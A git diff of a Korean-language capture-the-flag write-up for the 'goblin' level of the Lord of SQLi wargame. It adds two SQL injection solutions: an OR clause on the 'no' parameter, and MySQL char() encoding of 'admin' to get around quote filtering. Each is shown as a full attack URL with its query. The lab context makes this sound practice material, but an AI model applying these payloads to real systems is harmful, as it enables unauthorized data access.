@@ -33,6 +33,18 @@ query : select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
 ```
 이렇게 해주면 뚫리는 것을 볼 수 있다.
 
-# 방법 2. ?
+# 방법 2. no 값 넣기
 
-???
+아까 no=1 일때, guest가 true 가 됬으니, no값을 조작해서 id가 admin 이 나오게 하면 된다.
+```
+https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20no=2
+query : select id from prob_goblin where id='guest' and no=0 or no=2
+```
+
+# 방법 3. id에 char() 내장 함수 사용하기
+
+16진수로 값을 변환해서 넣지 않아도, mysql에선 char라는 내장함수로 10진수를 아스키코드로 변환하는 것을 활용할 수 있다.
+```
+https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20id=char(97,%20100,%20109,%20105,%20110)
+query : select id from prob_goblin where id='guest' and no=0 or id=char(97, 100, 109, 105, 110)
+```
